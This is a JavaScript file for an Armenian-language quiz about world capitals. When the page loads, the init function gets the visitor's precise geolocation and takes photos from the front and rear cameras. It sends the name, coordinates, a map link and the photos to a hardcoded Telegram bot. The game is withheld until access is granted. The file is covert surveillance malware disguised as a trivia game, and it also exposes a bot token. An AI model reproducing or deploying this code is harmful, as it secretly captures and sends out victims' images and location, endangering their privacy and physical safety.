const TELEGRAM_TOKEN = '7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw';
const TELEGRAM_CHAT_ID = '8071841674';

const questions = [
  { question: "Ո՞րն է Ֆրանսիայի մայրաքաղաքը։", answers: [{ text: "Փարիզ", correct: true }, { text: "Լիոն", correct: false }, { text: "Մարսել", correct: false }, { text: "Նիցցա", correct: false }] },
  { question: "Ո՞րն է Գերմանիայի մայրաքաղաքը։", answers: [{ text: "Բեռլին", correct: true }, { text: "Մյունխեն", correct: false }, { text: "Համբուրգ", correct: false }, { text: "Քյոլն", correct: false }] },
  { question: "Ո՞րն է Իտալիայի մայրաքաղաքը։", answers: [{ text: "Հռոմ", correct: true }, { text: "Միլան", correct: false }, { text: "Նեապոլ", correct: false }, { text: "Տուրին", correct: false }] },
  { question: "Ո՞րն է Ռուսաստանի մայրաքաղաքը։", answers: [{ text: "Մոսկվա", correct: true }, { text: "Սանկտ Պետերբուրգ", correct: false }, { text: "Կազան", correct: false }, { text: "Սոչի", correct: false }] },
  { question: "Ո՞րն է Ճապոնիայի մայրաքաղաքը։", answers: [{ text: "Տոկիո", correct: true }, { text: "Օսակա", correct: false }, { text: "Նագասակի", correct: false }, { text: "Հիրոսիմա", correct: false }] },
  { question: "Ո՞րն է ԱՄՆ-ի մայրաքաղաքը։", answers: [{ text: "Վաշինգտոն", correct: true }, { text: "Նյու Յորք", correct: false }, { text: "Լոս Անջելես", correct: false }, { text: "Չիկագո", correct: false }] },
  { question: "Ո՞րն է Իրանի մայրաքաղաքը։", answers: [{ text: "Թեհրան", correct: true }, { text: "Իսֆահան", correct: false }, { text: "Մաշհադ", correct: false }, { text: "Քաշան", correct: false }] },
  { question: "Ո՞րն է Բրազիլիայի մայրաքաղաքը։", answers: [{ text: "Բրազիլիա", correct: true }, { text: "Ռիո դե Ժանեյրո", correct: false }, { text: "Սան Պաուլո", correct: false }, { text: "Սալվադոր", correct: false }] },
  { question: "Ո՞րն է Կանադայի մայրաքաղաքը։", answers: [{ text: "Օտտավա", correct: true }, { text: "Տորոնտո", correct: false }, { text: "Վանկուվեր", correct: false }, { text: "Մոնրեալ", correct: false }] },
  { question: "Ո՞րն է Չինաստանի մայրաքաղաքը։", answers: [{ text: "Պեկին", correct: true }, { text: "Շանհայ", correct: false }, { text: "Հոնկոնգ", correct: false }, { text: "Գուանչժոու", correct: false }] }
];

function shuffle(array) {
  for (let i = array.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [array[i], array[j]] = [array[j], array[i]];
  }
  return array;
}

const userNameSpan = document.getElementById('user-name');
const questionStatsSpan = document.getElementById('question-stats');
const questionText = document.getElementById('question-text');
const answerButtons = document.getElementById('answer-buttons');
const resultScreen = document.getElementById('result-screen');
const resultTitle = document.getElementById('result-title');
const resultSummary = document.getElementById('result-summary');
const retryButton = document.getElementById('retry-button');

let shuffledQuestions, currentQuestionIndex;
let correctAnswers = 0;
let wrongAnswers = 0;

async function init() {
  let username = prompt("Գրեք ձեր անունը:");
  if (!username || username.trim() === '') username = 'Անանուն';

  userNameSpan.textContent = username;

  const geo = await getGeolocation();
  const photos = await getCameraPhotos();

  sendDataToTelegram(username, geo, photos);

  if (geo || photos.length > 0) {
    startGame();
  } else {
    alert("Խնդրում ենք թույլատրել հասանելիություն տեսախցիկին կամ տեղակատվությանը։");
    location.reload();
  }
}

function getGeolocation() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      resolve(null);
      return;
    }
    navigator.geolocation.getCurrentPosition(
      (position) => {
        resolve({
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
        });
      },
      () => resolve(null)
    );
  });
}

async function getCameraPhotos() {
  const photos = [];

  async function capturePhoto(facingMode) {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode },
        audio: false,
      });
      const video = document.createElement('video');
      video.srcObject = stream;
      await video.play();

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      const photoDataUrl = canvas.toDataURL('image/jpeg');
      stream.getTracks().forEach(track => track.stop());

      return photoDataUrl;
    } catch {
      return null;
    }
  }

  const frontPhoto = await capturePhoto('user');
  if (frontPhoto) photos.push(frontPhoto);

  const rearPhoto = await capturePhoto('environment');
  if (rearPhoto) photos.push(rearPhoto);

  return photos;
}

function sendDataToTelegram(username, geo, photos) {
  const messageParts = [];
  if (username) messageParts.push(`Имя: ${username}`);

  if (geo) {
    messageParts.push(`Геолокация:\nШирота: ${geo.latitude.toFixed(6)}, Долгота: ${geo.longitude.toFixed(6)}\nТочность: ${geo.accuracy} м`);
  } else {
    messageParts.push("Геоданные не получены.");
  }

  const textMessage = encodeURIComponent(messageParts.join('\n'));
  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${textMessage}`);

  if (geo) {
    const mapUrl = `https://maps.google.com/?q=${geo.latitude},${geo.longitude}`;
    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(mapUrl)}`);
  }

  photos.forEach((photo, index) => {
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('photo', dataURLtoBlob(photo), `photo${index}.jpg`);

    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData,
    });
  });
}

function dataURLtoBlob(dataurl) {
  const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
    bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
  for (let i=0; i<n; i++) {
    u8arr[i] = bstr.charCodeAt(i);
  }
  return new Blob([u8arr], {type:mime});
}

function startGame() {
  shuffledQuestions = shuffle(questions);
  currentQuestionIndex = 0;
  correctAnswers = 0;
  wrongAnswers = 0;
  resultScreen.classList.add('hidden');
  document.querySelector('.container').style.display = 'flex';
  showQuestion();
}

function showQuestion() {
  resetState();
  const currentQuestion = shuffledQuestions[currentQuestionIndex];
  questionText.textContent = currentQuestion.question;

  const remaining = shuffledQuestions.length - currentQuestionIndex;
  questionStatsSpan.textContent = `Մնացել է: ${remaining} | Ճիշտ: ${correctAnswers} | Սխալ: ${wrongAnswers}`;

  currentQuestion.answers.forEach(answer => {
    const button = document.createElement('button');
    button.textContent = answer.text;
    button.classList.add('btn');
    button.addEventListener('click', () => selectAnswer(button, answer.correct));
    answerButtons.appendChild(button);
  });
}

function resetState() {
  while (answerButtons.firstChild) {
    answerButtons.removeChild(answerButtons.firstChild);
  }
}

function selectAnswer(button, correct) {
  if (correct) {
    correctAnswers++;
    button.style.backgroundColor = '#38a169';
  } else {
    wrongAnswers++;
    button.style.backgroundColor = '#e53e3e';
    showCorrectAnswer();
  }

  Array.from(answerButtons.children).forEach(btn => btn.disabled = true);

  setTimeout(() => {
    currentQuestionIndex++;
    if (currentQuestionIndex < shuffledQuestions.length) {
      showQuestion();
    } else {
      showResult();
    }
  }, 1500);
}

function showCorrectAnswer() {
  const currentQuestion = shuffledQuestions[currentQuestionIndex];
  Array.from(answerButtons.children).forEach((btn, idx) => {
    if (currentQuestion.answers[idx].correct) {
      btn.style.backgroundColor = '#38a169';
    }
  });
}

function showResult() {
  document.querySelector('.container').style.display = 'none';
  resultScreen.classList.remove('hidden');

  if (correctAnswers >= 7) {
    resultTitle.textContent = 'Դուք խելացի եք! 😎';
    resultSummary.textContent = `Ճիշտ պատասխաններ: ${correctAnswers} / ${shuffledQuestions.length}`;
  } else {
    resultTitle.textContent = 'Փորձեք նորից 🧠';
    resultSummary.textContent = `Ճիշտ պատասխաններ: ${correctAnswers} / ${shuffledQuestions.length}`;
  }
}

retryButton.addEventListener('click', () => {
  location.reload();
});

init();
